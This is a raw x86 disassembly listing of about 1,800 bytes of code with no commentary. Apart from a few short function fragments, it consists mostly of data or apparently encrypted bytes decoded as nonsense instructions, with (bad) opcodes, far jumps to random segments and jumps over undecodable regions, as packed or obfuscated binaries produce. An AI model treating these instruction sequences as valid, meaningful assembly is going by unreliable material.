  40192f:	fdivr  st,st(3)
  401931:	inc    esp
  401932:	mov    ds:0xe44e2ea6,eax
  401937:	jb     0x4019aa
  401939:	out    0x53,eax
  40193b:	aad    0x34
  40193d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40193e:	cld    
  40193f:	fstp   QWORD PTR [edi-0x32]
  401942:	in     eax,dx
  401943:	adc    DWORD PTR [ecx-0x3e4c4d89],ebp
  401949:	cli    
  40194a:	call   0x6d7d:0x6768394b
  401951:	push   esp
  401952:	out    0x83,al
  401954:	push   0xffffffcc
  401956:	mov    ds,edi
  401958:	mov    ebx,0x216d065a
  40195d:	push   ebx
  40195e:	xchg   ebx,eax
  40195f:	test   eax,0x338a6263
  401964:	xor    eax,0x64afacce
  401969:	scas   eax,DWORD PTR es:[edi]
  40196a:	sti    
  40196b:	gs push es
  40196d:	icebp  
  40196e:	sbb    dl,BYTE PTR [eax+0x7a9c971c]
  401974:	jae    0x4019e6
  401976:	inc    ecx
  401977:	std    
  401978:	dec    esp
  401979:	mov    edx,0xea70c3d4
  40197e:	adc    al,BYTE PTR [ecx+eiz*8+0x77c7067c]
  401985:	icebp  
  401986:	fucomp st(6)
  401988:	mov    ebp,0x821f2367
  40198d:	or     edx,edx
  40198f:	xor    bh,BYTE PTR [esi+0x62fbcf01]
  401995:	dec    edx
  401996:	fst    st(1)
  401998:	cmp    esi,DWORD PTR [ecx]
  40199a:	nop
  40199b:	mov    edx,0x11d63760
  4019a0:	xchg   ebx,eax
  4019a1:	scas   al,BYTE PTR es:[edi]
  4019a2:	xchg   esi,eax
  4019a3:	mov    edi,0x36f150a3
  4019a8:	cmc    
  4019a9:	inc    esi
  4019aa:	dec    esp
  4019ab:	pop    esi
  4019ac:	adc    ah,dl
  4019ae:	xor    BYTE PTR [ebx],0xc2
  4019b1:	cmp    eax,0x8cb40b7d
  4019b6:	je     0x4019d9
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	test   BYTE PTR [edi+0x7b],bh
  401a1c:	dec    esp
  401a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a1e:	jnp    0x401a90
  401a20:	jo     0x4019b9
  401a22:	jge    0x401a94
  401a24:	jo     0x4019e9
  401a26:	sbb    dh,0x8f
  401a29:	sub    bh,ah
  401a2b:	cdq    
  401a2c:	inc    esi
  401a2d:	jmp    0xbe36:0x529a8d97
  401a34:	dec    edi
  401a35:	mov    esi,0x657a375e
  401a3a:	cli    
  401a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a3c:	xor    al,0xbf
  401a3e:	and    bh,ch
  401a40:	dec    edx
  401a41:	mov    cl,0x28
  401a43:	sbb    DWORD PTR [edx-0x52],0x3815b888
  401a4a:	test   al,0x49
  401a4c:	sbb    ah,BYTE PTR ds:0x4dd87836
  401a52:	fld    TBYTE PTR [ebx]
  401a54:	or     eax,ebx
  401a56:	jb     0x401aaf
  401a58:	out    dx,al
  401a59:	inc    esp
  401a5a:	and    al,0xa
  401a5c:	jo     0x401ac3
  401a5e:	hlt    
  401a5f:	pop    esp
  401a60:	sti    
  401a61:	test   BYTE PTR [edi+0x2a],bl
  401a64:	or     BYTE PTR [ecx+ebp*4-0x5f],dh
  401a68:	jp     0x401ab0
  401a6a:	fwait
  401a6b:	mov    bh,0x79
  401a6d:	ret    0x9a18
  401a70:	xor    cl,BYTE PTR [ebx-0x43]
  401a73:	sahf   
  401a74:	inc    ebp
  401a75:	inc    ecx
  401a76:	inc    BYTE PTR [esi-0xb]
  401a79:	fadd   QWORD PTR [edi-0x78]
  401a7c:	mov    esi,edi
  401a7e:	out    dx,eax
  401a7f:	jo     0x401a59
  401a81:	dec    ebx
  401a82:	sub    eax,edx
  401a84:	mov    edi,0x7a374035
  401a89:	mov    ch,0x1f
  401a8b:	lock dec ebp
  401a8d:	and    esp,DWORD PTR ds:0xd141093e
  401a93:	fisub  DWORD PTR ds:0xe6e8a258
  401a99:	xor    dl,BYTE PTR [eax+0x53924cdd]
  401a9f:	and    eax,0x8db4739a
  401aa4:	pop    ebx
  401aa5:	cld    
  401aa6:	inc    esp
  401aa7:	out    dx,al
  401aa8:	es push esp
  401aaa:	pushf  
  401aab:	add    al,0x23
  401aad:	test   DWORD PTR [edx-0x455ed82c],ecx
  401ab3:	sbb    bh,BYTE PTR [ecx-0x6a]
  401ab6:	icebp  
  401ab7:	pop    ds
  401ab8:	dec    edx
  401ab9:	xchg   esp,eax
  401aba:	js     0x401ac7
  401abc:	ret    0x27f0
  401abf:	in     al,0x44
  401ac1:	pop    edx
  401ac2:	inc    edi
  401ac3:	xchg   edi,eax
  401ac4:	add    eax,0x4afce255
  401ac9:	add    eax,eax
  401acb:	mov    ds,WORD PTR [ecx]
  401acd:	mov    BYTE PTR [ecx+edi*1],ah
  401ad0:	push   0xffffffdd
  401ad2:	xchg   ebx,eax
  401ad3:	fs aaa 
  401ad5:	dec    ecx
  401ad6:	pop    esi
  401ad7:	inc    BYTE PTR [ebp+0x7b]
  401ada:	jmp    0x420a:0x989b3992
  401ae1:	xchg   edx,eax
  401ae2:	adc    BYTE PTR [eax+0xdb81be],dh
  401ae8:	xchg   ebp,eax
  401ae9:	aam    0x83
  401aeb:	jne    0x401ae1
  401aed:	popa   
  401aee:	call   0xa518:0x30962b2f
  401af5:	test   BYTE PTR [ebp+0x7095d2cb],dl
  401afb:	jle    0x401b12
  401afd:	mov    al,BYTE PTR [ecx+0x2a]
  401b00:	mov    edi,0x898067d2
  401b05:	test   BYTE PTR [esi],dl
  401b07:	and    DWORD PTR [ecx],edi
  401b09:	lea    eax,[ebx-0x79]
  401b0c:	fs jo  0x401ab0
  401b0f:	aaa    
  401b10:	jne    0x401af2
  401b12:	jnp    0x401b75
  401b14:	sub    cl,ch
  401b16:	push   edx
  401b17:	es sub ah,0xef
  401b1b:	jmp    0x325bcc85
  401b20:	or     al,0x38
  401b22:	mov    eax,0x1a0038d4
  401b27:	je     0x401b56
  401b29:	ficomp DWORD PTR ds:0xa5254981
  401b2f:	fwait
  401b30:	mov    ?,WORD PTR [ebp-0x5e]
  401b33:	xor    al,0x45
  401b35:	xor    edi,esp
  401b37:	ja     0x401b64
  401b39:	push   edi
  401b3a:	call   0xd435:0x6f98494d
  401b41:	mov    eax,0xd56c6e23
  401b46:	ins    DWORD PTR es:[edi],dx
  401b47:	dec    edi
  401b48:	outs   dx,DWORD PTR ds:[esi]
  401b49:	mov    WORD PTR [ecx-0x79],ds
  401b4c:	push   ds
  401b4d:	or     ecx,DWORD PTR [ebx]
  401b4f:	cld    
  401b50:	dec    edi
  401b51:	lods   al,BYTE PTR ds:[esi]
  401b52:	ds retf 
  401b54:	ss in  eax,dx
  401b56:	mov    ecx,0x473caa4d
  401b5b:	pop    ss
  401b5c:	adc    al,0xaa
  401b5e:	mov    dl,0xbb
  401b61:	pop    ecx
  401b62:	nop
  401b63:	add    eax,0x2878c495
  401b68:	push   esp
  401b69:	leave  
  401b6a:	pop    esp
  401b6b:	cmp    al,0x74
  401b6d:	cmp    BYTE PTR [ebx+eiz*1],dl
  401b70:	mov    ch,0xb
  401b72:	inc    ebp
  401b73:	das    
  401b74:	out    dx,eax
  401b75:	push   eax
  401b76:	jp     0x401b9c
  401b78:	cwde   
  401b79:	mov    dl,0x8
  401b7b:	out    0x83,al
  401b7d:	fidivr DWORD PTR [ecx]
  401b7f:	es aam 0x5a
  401b82:	or     cl,BYTE PTR [edx-0x3ebfac59]
  401b88:	retf   
  401b89:	jnp    0x401ba2
  401b8b:	xchg   bx,ax
  401b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b8e:	out    0x7,al
  401b90:	lods   al,BYTE PTR ds:[esi]
  401b91:	not    DWORD PTR [ebp+0x63110d43]
  401b97:	jb     0x401b6c
  401b99:	or     al,0x9e
  401b9b:	ss (bad) 
  401b9e:	adc    BYTE PTR [ecx-0x2b2e52e2],dh
  401ba4:	sti    
  401ba5:	call   0x30b9:0x3d8a3a13
  401bac:	faddp  st(3),st
  401bae:	jmp    0x1eba7734
  401bb3:	fnstcw WORD PTR [ecx-0x357f2e69]
  401bb9:	mov    al,0x1c
  401bbb:	mov    gs,WORD PTR [ecx-0x5328229b]
  401bc1:	je     0x401c31
  401bc3:	fcmovne st,st(0)
  401bc5:	aas    
  401bc6:	sub    al,0x7c
  401bc8:	arpl   WORD PTR [ecx],dx
  401bca:	mov    ah,BYTE PTR ds:0xc0c267c6
  401bd0:	hlt    
  401bd1:	mov    eax,0x3d60f9c6
  401bd6:	mov    ds:0xe263cf46,eax
  401bdb:	cmp    dh,dh
  401bdd:	fadd   QWORD PTR [esi]
  401bdf:	cld    
  401be0:	add    BYTE PTR [esi],bl
  401be2:	loop   0x401c41
  401be4:	jno    0x401c2c
  401be6:	rol    DWORD PTR [esi],0x4b
  401be9:	das    
  401bea:	xchg   ebx,eax
  401beb:	mul    eax
  401bed:	fcomp  QWORD PTR [ecx]
  401bef:	add    BYTE PTR [esi+0x4a9687c5],0x66
  401bf6:	mov    DWORD PTR [edx],ecx
  401bf8:	cmp    dh,BYTE PTR [edi-0x591b1efc]
  401bfe:	sbb    ebp,eax
  401c00:	cmp    edi,DWORD PTR [edi-0x6f]
  401c03:	hlt    
  401c04:	mov    eax,0x8004db59
  401c09:	repnz adc DWORD PTR [edx-0x6c],0xbab11548
  401c11:	xor    al,0x88
  401c13:	or     eax,esp
  401c15:	mov    cl,0x15
  401c17:	cmc    
  401c18:	xrelease lock or BYTE PTR [edi+0x44],bh
  401c1d:	ds inc esp
  401c1f:	jmp    0x401c36
  401c21:	add    al,0x9a
  401c23:	nop
  401c24:	inc    esi
  401c25:	sbb    DWORD PTR [eax+0x20],ecx
  401c28:	mov    ss,WORD PTR [ebx+0x4deff5d]
  401c2e:	jmp    0x401c17
  401c30:	push   cs
  401c31:	add    ebx,DWORD PTR [esi]
  401c33:	lock adc BYTE PTR [eax-0x61c68727],dh
  401c3a:	in     al,dx
  401c3b:	cmp    bh,BYTE PTR [ecx]
  401c3d:	push   eax
  401c3e:	pop    edi
  401c3f:	add    eax,0xfe29708d
  401c44:	adc    al,0x7a
  401c46:	fwait
  401c47:	push   0x85c75176
  401c4c:	mov    cs,WORD PTR [edx+0x5bf4dba1]
  401c52:	addr16 jmp 0xcb70:0xc02191b0
  401c5a:	test   BYTE PTR [ebx],bl
  401c5c:	inc    edx
  401c5d:	lock mov ds:0x5f200e8e,eax
  401c63:	cmp    al,0xc4
  401c65:	sbb    BYTE PTR [eax-0x47],0xbf
  401c69:	mov    ebp,0xb1f922a9
  401c6e:	inc    esi
  401c6f:	popa   
  401c70:	jmp    0xd58065bb
  401c75:	and    bl,BYTE PTR [esp+edi*1]
  401c78:	mov    edi,0xf36219ea
  401c7d:	dec    esp
  401c7e:	rol    esi,cl
  401c80:	inc    edx
  401c81:	push   edi
  401c82:	jnp    0x401cd6
  401c84:	xchg   edi,eax
  401c85:	mov    ebx,0x8817e484
  401c8a:	push   ebx
  401c8b:	xchg   ebp,eax
  401c8c:	ffree  st(7)
  401c8e:	lahf   
  401c8f:	mov    eax,0x7414ceb4
  401c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c95:	and    esp,DWORD PTR [eax+ebp*1+0x6e2c2071]
  401c9c:	bound  edi,QWORD PTR [edx+ebx*8+0x2c]
  401ca0:	idiv   BYTE PTR [ecx+0x543324db]
  401ca6:	and    eax,0x5478a962
  401cab:	stos   DWORD PTR es:[edi],eax
  401cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cad:	xchg   ecx,eax
  401cae:	inc    eax
  401caf:	add    dh,0x3b
  401cb2:	dec    esp
  401cb3:	in     al,dx
  401cb4:	outs   dx,BYTE PTR ds:[esi]
  401cb5:	jbe    0x401c4f
  401cb7:	scas   al,BYTE PTR es:[edi]
  401cb8:	jo     0x401d2b
  401cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cbb:	ret    0xd0fe
  401cbe:	cmp    dl,bl
  401cc0:	xor    DWORD PTR [edi-0x70],eax
  401cc3:	cdq    
  401cc4:	jne    0x401d2a
  401cc6:	add    BYTE PTR [ebx],0x9f
  401cc9:	rcr    BYTE PTR [edx-0x1f],0x51
  401ccd:	les    ebx,FWORD PTR [esi+ebx*1+0x41]
  401cd1:	inc    edi
  401cd2:	es ret 0x9371
  401cd6:	imul   ecx,DWORD PTR [ebp+0x4479d075],0x2c
  401cdd:	ror    BYTE PTR [edi+0x42],0xc7
  401ce1:	xor    DWORD PTR [esi-0x4e],0x29
  401ce5:	xlat   BYTE PTR ds:[ebx]
  401ce6:	dec    ebx
  401ce7:	popa   
  401ce8:	rcr    BYTE PTR [ebp-0x23],cl
  401ceb:	repnz test BYTE PTR [esi+0x6b],al
  401cef:	jb     0x401ca9
  401cf1:	sub    al,0x82
  401cf3:	lods   eax,DWORD PTR ds:[esi]
  401cf4:	jecxz  0x401cff
  401cf6:	test   eax,0xbe761404
  401cfb:	lock ja 0x401d5e
  401cfe:	xchg   DWORD PTR ds:0xc36fe6c,edx
  401d04:	es jmp 0x401d65
  401d07:	pop    ebp
  401d08:	(bad)  
  401d09:	retf   
  401d0a:	pop    edx
  401d0b:	add    ebp,DWORD PTR [esp+edi*4+0x69dce403]
  401d12:	(bad)  
  401d14:	mov    ebx,0xdaad7518
  401d19:	pop    esi
  401d1a:	mov    cl,bl
  401d1c:	bound  eax,QWORD PTR [ebx]
  401d1e:	stc    
  401d1f:	les    esp,FWORD PTR [edx-0x15]
  401d22:	xor    dl,dh
  401d24:	push   eax
  401d25:	(bad)  
  401d26:	xlat   BYTE PTR ds:[ebx]
  401d27:	mov    DWORD PTR [ebx-0x23664674],edx
  401d2d:	mov    ebp,0x3b0685c9
  401d32:	cmp    DWORD PTR [eax],0x54641386
  401d38:	mov    esi,DWORD PTR [ecx-0x3c]
  401d3b:	pop    esi
  401d3c:	retf   
  401d3d:	aad    0x21
  401d3f:	mov    dh,0xcb
  401d41:	add    eax,0x7fb6f9bc
  401d47:	xchg   ebp,eax
  401d48:	cmp    bl,bl
  401d4a:	cli    
  401d4b:	sbb    al,0x7e
  401d4d:	pushf  
  401d4e:	or     al,0x4d
  401d50:	sbb    eax,0x47f90756
  401d55:	cdq    
  401d56:	call   0x7575b758
  401d5b:	fstp   st(1)
  401d5d:	sahf   
  401d5e:	shl    BYTE PTR [ebp+0xf2bda34],0x59
  401d65:	cmp    dl,BYTE PTR [ecx+0x745c8f29]
  401d6b:	and    DWORD PTR [edi+0x19],eax
  401d6e:	xor    DWORD PTR [esi+0x45c3bb63],eax
  401d74:	cmc    
  401d75:	shr    DWORD PTR [ecx*8-0x7ffe79cf],1
  401d7c:	sub    ecx,DWORD PTR [esi*2+0x27835bc3]
  401d83:	mov    esi,0xbaa117da
  401d88:	(bad)  
  401d89:	jne    0x401d73
  401d8b:	sub    BYTE PTR [ebp-0x35],dl
  401d8e:	iret   
  401d8f:	(bad)  
  401d90:	das    
  401d91:	push   es
  401d92:	retf   0x8a5d
  401d95:	sub    al,0x1c
  401d97:	push   ss
  401d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d99:	cmc    
  401d9a:	rcr    DWORD PTR [edi-0x5f],cl
  401d9d:	out    0xc7,eax
  401d9f:	mov    bh,0xe8
  401da1:	dec    edx
  401da2:	cdq    
  401da3:	frstor [esi-0x48d98fc3]
  401da9:	(bad)  
  401dab:	sub    bh,BYTE PTR [eax]
  401dad:	ror    DWORD PTR [ebx],cl
  401daf:	add    DWORD PTR [eax],ebx
  401db1:	mov    eax,0x7f758ada
  401db6:	cwde   
  401db7:	pop    ss
  401db8:	sub    esp,DWORD PTR [esi-0x18b0a07e]
  401dbe:	push   ecx
  401dbf:	push   ecx
  401dc0:	xor    DWORD PTR ds:0x434266,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432cde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432cce,0x43426e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	dec    edi
  401df0:	retf   0xe7a1
  401df3:	cmp    eax,DWORD PTR [edi]
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401e72
  401dfc:	fdivr  st,st(7)
  401dfe:	sub    BYTE PTR [esi],ch
  401e00:	fisttp DWORD PTR [esi+0xa]
  401e03:	mov    ebp,0x4661cb7e
  401e08:	dec    esp
  401e09:	iret   
  401e0a:	dec    ebx
  401e0b:	xchg   edi,eax
  401e0c:	aaa    
  401e0d:	cmp    ecx,0x3f
  401e10:	scas   al,BYTE PTR es:[edi]
  401e11:	pushf  
  401e12:	adc    al,0xe0
  401e14:	sbb    DWORD PTR [edi],eax
  401e16:	jle    0x401dfa
  401e18:	add    BYTE PTR [eax+eax*4],bh
  401e1b:	loop   0x401e0d
  401e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e1e:	nop
  401e1f:	lds    ecx,FWORD PTR [edi]
  401e21:	mov    ds:0x7fef4455,eax
  401e26:	cwde   
  401e27:	sub    BYTE PTR [edi+0xf7f2d38],ch
  401e2d:	xor    BYTE PTR [ebp+0xda9c254],ch
  401e33:	pop    ss
  401e34:	retf   
  401e35:	and    eax,0x6d6c3d9c
  401e3a:	sub    eax,0x32374f96
  401e3f:	push   0xd98b7949
  401e44:	mov    esi,ebp
  401e46:	ret    0xe471
  401e49:	adc    bl,al
  401e4b:	push   cs
  401e4c:	inc    esi
  401e4d:	xor    BYTE PTR [ebx-0xe],dh
  401e50:	sub    eax,0x2019f317
  401e55:	sbb    BYTE PTR [eax],cl
  401e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e58:	sbb    eax,0x468319bc
  401e5d:	cmp    al,0x39
  401e5f:	adc    eax,DWORD PTR cs:[ecx+0x29]
  401e63:	ret    0x3546
  401e66:	adc    ecx,eax
  401e68:	fcomp  QWORD PTR [edi-0x6]
  401e6b:	jl     0x401e40
  401e6d:	sub    edx,DWORD PTR [eax]
  401e6f:	aaa    
  401e70:	adc    ebx,DWORD PTR [ecx-0x68]
  401e73:	inc    ebp
  401e74:	cmp    ah,BYTE PTR [edi+0x26f3b607]
  401e7a:	repnz in eax,dx
  401e7c:	add    eax,0xc90303c8
  401e81:	push   edx
  401e82:	mov    bl,0x22
  401e84:	pop    eax
  401e85:	lahf   
  401e86:	pop    fs
  401e88:	push   edi
  401e89:	mov    edi,0x9d895f4
  401e8e:	or     DWORD PTR [edx-0x6ec7e609],esp
  401e94:	xor    al,0xc4
  401e96:	es push es
  401e98:	inc    eax
  401e99:	mov    ebp,0x57eef52e
  401e9e:	sbb    BYTE PTR [edx-0x1627617c],cl
  401ea4:	sub    dl,dh
  401ea6:	lahf   
  401ea7:	jno    0x401ec5
  401ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eaa:	(bad)  
  401eab:	cld    
  401eac:	rcr    BYTE PTR [ecx-0x2aae6784],cl
  401eb2:	xor    ch,BYTE PTR [ecx-0x6c9d2e53]
  401eb8:	jae    0x401e8a
  401eba:	fmul   QWORD PTR [ebp-0x5a97e1df]
  401ec0:	mov    eax,ds:0xb5e2468e
  401ec5:	jo     0x401e49
  401ec7:	adc    ecx,DWORD PTR [ecx+0x15751ec3]
  401ecd:	jae    0x401ec0
  401ecf:	mov    BYTE PTR [edx+0x7292352c],0xa0
  401ed6:	pop    es
  401ed7:	mov    eax,ds:0x2ce0c2e1
  401edc:	into   
  401edd:	clc    
  401ede:	dec    ebx
  401edf:	outs   dx,BYTE PTR ds:[esi]
  401ee0:	xchg   ebx,eax
  401ee1:	repz mov edx,0x32ccd697
  401ee7:	cwde   
  401ee8:	scas   eax,DWORD PTR es:[edi]
  401ee9:	addr16 adc al,0xc8
  401eec:	jns    0x401eb3
  401eee:	xor    esp,DWORD PTR [esi-0x56984abc]
  401ef4:	adc    esi,edx
  401ef6:	mov    esi,0xf7783482
  401efb:	popf   
  401efc:	sbb    DWORD PTR [ebx],esp
  401efe:	clc    
  401eff:	retf   
  401f00:	adc    esi,eax
  401f02:	or     bl,BYTE PTR [eax]
  401f04:	addr16 pop eax
  401f06:	xchg   esi,eax
  401f07:	jns    0x401e8c
  401f09:	dec    ebx
  401f0a:	jns    0x401eee
  401f0c:	jae    0x401eb7
  401f0e:	jecxz  0x401f8f
  401f10:	jnp    0x401f48
  401f12:	mov    ebp,0x98480421
  401f17:	jmp    0x1c99e0a2
  401f1c:	scas   al,BYTE PTR es:[edi]
  401f1d:	pop    edx
  401f1e:	xchg   ebx,eax
  401f1f:	in     eax,0xef
  401f21:	fwait
  401f22:	das    
  401f23:	pop    edi
  401f24:	fmul   QWORD PTR [ecx-0x52]
  401f27:	push   esp
  401f28:	mov    ds:0x33c52ff8,al
  401f2d:	push   0x35
  401f2f:	not    BYTE PTR [esi-0x3054bcf3]
  401f35:	popf   
  401f36:	ret    0x707c
  401f39:	sub    bh,0x25
  401f3c:	ror    eax,cl
  401f3e:	arpl   WORD PTR [edx+0x5e9a03c],bx
  401f44:	or     ecx,esi
  401f46:	in     eax,dx
  401f47:	inc    esi
  401f48:	jle    0x401ed0
  401f4a:	arpl   WORD PTR [esi],bx
  401f4c:	gs in  al,0xd7
  401f4f:	mov    eax,ds:0x3f7ad88a
  401f54:	mov    WORD PTR [esi+0x69],ds
  401f57:	mov    eax,ds:0xbe2bcebc
  401f5c:	jecxz  0x401f87
  401f5e:	push   ss
  401f5f:	scas   eax,DWORD PTR es:[edi]
  401f60:	fiadd  DWORD PTR [esi+0x620246ea]
  401f66:	dec    ebp
  401f67:	shl    edx,1
  401f69:	jmp    0x7700e251
  401f6e:	push   0x1a
  401f70:	pop    edx
  401f71:	shl    bh,cl
  401f73:	cli    
  401f74:	dec    esp
  401f75:	add    al,0x85
  401f77:	jmp    0xcfee:0xf629e1a2
  401f7e:	mov    dh,0x18
  401f80:	or     eax,DWORD PTR [edx+0x34]
  401f83:	ret    
  401f84:	xchg   esi,eax
  401f85:	les    esi,FWORD PTR [eax-0x28]
  401f88:	sbb    BYTE PTR [edx],ch
  401f8a:	push   ecx
  401f8b:	mov    cl,0xd8
  401f8d:	imul   ecx,DWORD PTR [esi],0x5887f3f5
  401f93:	aam    0xef
  401f95:	sub    BYTE PTR [ebp+0x29],0x1e
  401f99:	lock push 0xffffffd5
  401f9c:	inc    ecx
  401f9d:	and    edx,DWORD PTR [eax+esi*8-0x56]
  401fa1:	lds    esp,FWORD PTR ds:0xd46eacb8
  401fa7:	std    
  401fa8:	in     eax,0x7d
  401faa:	sbb    edi,ebx
  401fac:	out    0x9d,al
  401fae:	retf   
  401faf:	and    eax,0xe5dc1f04
  401fb4:	enter  0x5b8d,0xa3
  401fb8:	add    dl,BYTE PTR [eax-0x26]
  401fbb:	test   eax,ebp
  401fbd:	or     eax,0xba6fe39a
  401fc2:	fwait
  401fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fc4:	or     DWORD PTR [ebx-0x3a01042a],ebx
  401fca:	mov    bh,0x9c
  401fcc:	dec    esi
  401fcd:	or     al,0x2
  401fcf:	or     ah,dl
  401fd1:	out    dx,al
  401fd2:	out    0x24,eax
  401fd4:	es mov edi,0x3ae8625
  401fda:	jp     0x401f80
  401fdc:	lahf   
  401fdd:	add    ebx,DWORD PTR ds:0x6dc94a41
  401fe3:	sbb    BYTE PTR [esi-0x29],al
  401fe6:	mov    al,ds:0xd2ba0424
  401feb:	mov    ebx,0xdf33353d
  401ff0:	cld    
  401ff1:	sti    
  401ff2:	xor    dh,BYTE PTR [edi]
  401ff4:	repnz push DWORD PTR [edi-0x43]
  401ff8:	xchg   ebx,eax
  401ff9:	pop    eax
  401ffa:	add    DWORD PTR ds:0xd575dbd3,esi
  402000:	das    
  402001:	stc    
  402002:	mov    bl,BYTE PTR [ebx+0x16]
  402005:	(bad)  
  402006:	std    
  402007:	in     al,dx
  402008:	inc    ebx
  402009:	fsub   QWORD PTR [ebx-0x4f]
  40200c:	xchg   DWORD PTR fs:0x9a16021f,ebx
  402013:	xchg   esi,eax
  402014:	jecxz  0x401fc8
  402016:	pop    ebx
  402017:	cmp    BYTE PTR [esi+0x26],dh
  40201a:	cmp    esp,ebp
  40201c:	xchg   ebx,eax
  40201d:	push   ds
  40201e:	shr    DWORD PTR [edi+ebp*2+0x6982096d],cl
  402025:	ins    BYTE PTR es:[edi],dx
  402026:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  402028:	cwde   
  402029:	dec    esi
  40202a:	and    al,0x24
  40202c:	pushf  
  40202d:	sub    al,0x84
  40202f:	sti    
  402030:	cmc    
  402031:	not    DWORD PTR [ebx-0x7]
  402034:	popf   
  402035:	lahf   
  402036:	xor    esi,ebp
  402038:	repnz ins DWORD PTR es:[edi],dx
  40203a:	or     edi,DWORD PTR [esi-0x109c4c42]
  402040:	idiv   BYTE PTR [ecx+0x3fd8ed69]
  402046:	mov    bl,0x69
  402048:	sub    BYTE PTR [ecx+0x6d],dh
  40204b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40204c:	jle    0x402060
  40204e:	push   0xf2779fc7
  402053:	sub    BYTE PTR [esi],ah
  402055:	out    dx,eax
  402056:	mul    DWORD PTR [ebx-0x6b]
  402059:	stc    
  40205a:	mov    ?,WORD PTR [eax+0x25]
  40205d:	jb     0x402091
  40205f:	in     al,dx
  402060:	mov    BYTE PTR [ebx],al
  402062:	gs dec ecx
  402064:	in     eax,0xf9
  402066:	je     0x40204c
  402068:	int3   
  402069:	sub    BYTE PTR [ebx+edi*8],bh
  40206c:	push   0xe71a123e
  402071:	mov    esi,0xbc3e711
  402076:	push   edi
  402077:	retf   
  402078:	int    0xd1
  40207a:	and    al,0xd7
  40207c:	aam    0x45
  40207e:	aad    0x2a
  402080:	dec    edi
  402081:	cwde   
  402082:	imul   BYTE PTR [edx-0x966e087]
  402088:	mov    bl,0x93
  40208a:	xor    al,0xf2
  40208c:	popa   
  40208d:	in     al,0x38
  40208f:	push   ebp
  402090:	inc    ebx
  402091:	inc    edi
  402092:	dec    edx
  402093:	(bad)  
  402094:	aad    0xe1
  402096:	xor    DWORD PTR [edx+0x15],0xffffff83
  40209a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40209b:	fcom   QWORD PTR [ecx-0x23e330f3]
  4020a1:	sub    eax,0x42095f4c
  4020a6:	clc    
  4020a7:	(bad)  
  4020a8:	call   0x77390b02
  4020ad:	mov    BYTE PTR [edx],ch
  4020af:	pop    ebx
  4020b0:	mov    eax,ds:0xeff732e6
  4020b5:	jne    0x40210a
  4020b7:	in     eax,dx
  4020b8:	add    al,0x71
  4020ba:	int    0x67
  4020bc:	inc    ecx
  4020bd:	xchg   esi,eax
  4020be:	mov    cl,0xdd
  4020c0:	lds    esp,FWORD PTR [ecx-0x4a3610e9]
  4020c6:	mov    bh,0xdb
  4020c8:	add    ch,BYTE PTR [eax+0x5b99753]
  4020ce:	test   eax,0xe3d6b24c
  4020d3:	into   
  4020d4:	xchg   ebx,eax
  4020d5:	repnz in al,dx
  4020d7:	mov    ds:0x975e5372,eax
  4020dc:	cli    
  4020dd:	adc    al,BYTE PTR [esi+0x11c27047]
  4020e3:	popf   
  4020e4:	stos   BYTE PTR es:[edi],al
  4020e5:	dec    esi
  4020e6:	dec    eax
  4020e7:	sub    dh,BYTE PTR [ebx+0x6e8bd51c]
  4020ed:	cdq    
  4020ee:	dec    edi
  4020ef:	jmp    0x667f13c7
  4020f4:	dec    eax
  4020f5:	push   edi
  4020f6:	mov    bl,BYTE PTR [ebp+0x2e]
  4020f9:	sbb    dh,BYTE PTR [edi+0x6da7c384]
  4020ff:	inc    eax
  402100:	push   esp
  402101:	lahf   
  402102:	in     al,dx
  402103:	test   BYTE PTR [edi],bl
  402105:	fnstcw WORD PTR [ecx]
  402107:	and    DWORD PTR [eax+eiz*1-0x29],ebp
  40210b:	dec    eax
  40210c:	pop    ss
  40210d:	aam    0x3d
  40210f:	sub    eax,0x5ee0ff8
  402114:	mov    gs,WORD PTR [ecx+esi*2]
  402117:	add    DWORD PTR [eax],0xffffffc5
  40211a:	test   eax,0x1ae61bda
  40211f:	ret    
  402120:	popf   
  402121:	mov    ch,0xbf
